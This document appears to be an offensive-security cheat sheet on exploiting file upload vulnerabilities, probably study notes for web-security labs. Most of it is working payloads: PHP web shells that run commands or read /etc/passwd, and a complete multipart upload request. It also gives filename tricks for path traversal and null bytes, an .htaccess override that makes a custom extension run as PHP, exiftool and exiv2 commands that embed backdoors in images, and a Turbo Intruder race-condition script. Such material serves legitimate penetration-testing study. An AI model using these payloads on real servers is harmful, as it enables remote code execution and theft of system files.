# 🟩 File Upload

When a web server allows users to upload files to its filesystem without validating

<mark style="color:green;">**"Content-Type" header:**</mark>

* simple text like name, address: "application/x-www-form-url-encoded"
* large amounts of binary data, like image or a PDF: "multipart/form-data"

<mark style="color:green;">**"**</mark><mark style="color:green;">**Content-Disposition" header:**</mark>

* If request message body is split into separate parts, each part contains a "Content-Disposition" header, which provides some basic information about the input field. and it has a "Content-Type" header which tells the server the MIME type of the data that was submitted using this input.

## <mark style="color:red;">Exploiting</mark>

### <mark style="color:orange;">PHP web shell upload</mark>

```http
// Send in a HTTP request body
<?php echo file_get_contents('/path/to/target/file'); ?>
```

```
// Send in a HTTP request body
<?php echo system($_GET['command']); ?>

// Usage in HTTP GET request
GET /example/exploit.php?command=id HTTP/1.1 
```

**Example**

```http
// Edit HTTP request with "BurpSuit Proxy"

POST /my-account/avatar HTTP/1.1
Host: test.net
LOPLOP
Content-Type: multipart/form-data; boundary=---------------------------4714704787410783474211833593
Content-Length: 523
LOPLOP
-----------------------------4714704787410783474211833593
Content-Disposition: form-data; name="avatar"; filename="f.php"
Content-Type: image/png

<?php echo file_get_contents('/etc/passwd'); ?>
-----------------------------4714704787410783474211833593
Content-Disposition: form-data; name="user"

TEST
-----------------------------4714704787410783474211833593
```

### <mark style="color:orange;">Web shell upload via path traversal</mark>

```
// Send file upload request:
Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
```

### <mark style="color:orange;">Overriding the server configuration</mark>

&#x20;Load a directory-specific configuration from a file and edit it:\
\- IIS Server: "web.config"\
\- Apache Server: ".htaccess"

### <mark style="color:orange;">Obfuscating file extensions</mark>

Most exhaustive blacklists can potentially be bypassed using classic obfuscation techniques

**Example**\
In the "Content-Disposition" header, change the value of the filename parameter to:&#x20;

```
Content-Disposition: form-data; name="avatar"; filename="exploit.php%00.jpg"
```

or

```
- exploit.pHp
- exploit.php.jpg
- exploit.php.
- exploit.p.phphp 
- using the URL encoding (or double URL encoding) for dots: exploit%2Ephp
- Add semicolons or URL-encoded null byte characters before the file extension: exploit.asp;.jpg or exploit.asp%00.jpg
- using multibyte unicode characters like xC0 x2E, xC4 xAE or xC0 xAE
```

### <mark style="color:orange;">Web shell upload via extension blacklist bypass (upload malicious .htaccess file)</mark>

Send request which upload file to server in Burp Repeater then:

* Change the value of the "**filename**" parameter to "**.htaccess**"
* Change the value of the "**Content-Type**" header to "**text/plain**"
* Replace payload with\
  `AddType application/x-httpd-php .l33t`
* Resend the request with your payload and its "**filename**" should be "**exploit.l33t**"
* Now web shell was successfully uploaded.

### <mark style="color:orange;">Remote code execution via polyglot web shell upload</mark>

```
// This adds your PHP payload to the image's Comment field

$ exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/path/secret_file') . ' END'; ?>" icon.png -o polyglot.php
$ exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' backdoor.jpeg
```

### <mark style="color:orange;">Exploiting file upload race conditions</mark>

Create a polyglot PHP/JPG file that is fundamentally a normal image, but contains your PHP payload in its metadata

**Example**

As you can see from the source code above, the uploaded file is moved to an accessible folder, where it is checked for viruses. Malicious files are only removed once the virus check is complete. This means it's possible to execute the file in the small time-window before it is removed.\
\
To solve this challenge, we can use **Turbo Intruder**. Turbo Intruder is a Burp Suite extension for sending large numbers of HTTP requests and analyzing the results

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)

    request1 = '''<YOUR-POST-REQUEST>'''  # Post web shell to run your payload

    request2 = '''<YOUR-GET-REQUEST>'''    # Get web shell output
    
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)

```

### <mark style="color:orange;">Exploiting file upload vulnerabilities without remote code execution</mark>

#### <mark style="color:green;">Uploading malicious client-side scripts</mark>

If you can upload HTML files or SVG images, you can potentially use tags to create stored XSS payloads.

#### <mark style="color:green;">Exploiting vulnerabilities in the parsing of uploaded files</mark>

You know that the server parses XML-based files, such as Microsoft Office .doc or .xls files, this may be a potential vector for XXE injection attacks.

